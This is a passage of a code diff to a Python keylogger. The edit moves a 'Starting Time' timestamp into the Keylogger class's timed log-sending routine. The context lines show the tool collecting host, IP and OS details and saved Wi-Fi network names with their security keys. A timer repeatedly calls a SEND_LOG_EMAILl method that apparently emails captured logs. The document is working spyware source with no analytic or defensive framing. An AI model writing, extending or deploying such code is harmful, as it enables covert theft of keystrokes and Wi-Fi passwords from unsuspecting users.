@@ -83,7 +83,6 @@ try:
 except socket.gaierror: 
     host_name  = 'None'
     host_ip    = 'None'       
-time_date  = now = datetime.datetime.now()
 os_name    = platform.system()
 os_release = platform.release()
 try:
@@ -220,7 +219,6 @@ print2password  = 'Security key      ..........| '+str(password2)
 Linux_wifi3     = 'Interface Wi-Fi   ..........| '+str(ssid3)
 Create_Time3    = 'Modefied Time     ..........| '+str(TCssid3)
 print3password  = 'Security key      ..........| '+str(password3)      
-print_time      = 'Starting Time     ..........| '+str(time_date)
 print_line      = '='*40+'\n'
 print_info      = "Wifi Info         ..........| No WiFi InterFace Found"
 if  os.path.exists('.log_Key'):        
@@ -242,7 +240,6 @@ class Keylogger:
                  global print_local_ip
                  global print_os_name
                  global print_os_re
-                 global print_time
                  global print_line
                  global host_name
                  global print_SSID
@@ -326,7 +323,9 @@ class Keylogger:
             self.SEND_LOG_EMAILl()
             self.log = " "
             timer = threading.Timer(self.time_count , self.START_SEND_ANDTIME)
-            timer.start()                
+            timer.start()  
+            self.time_date  = now = datetime.datetime.now()
+            self.print_time          =   'Starting Time          ..........| '+str(self.time_date)
             if 'None'in Linux_wifi1 and 'None'in Create_Time1 and 'None'in print1password \
                        and 'None'in Linux_wifi2 and 'None'in Create_Time2 and 'None'in print2password \
                        and 'None'in Linux_wifi3 and 'None'in Create_Time3 and 'None'in print3password :                                 
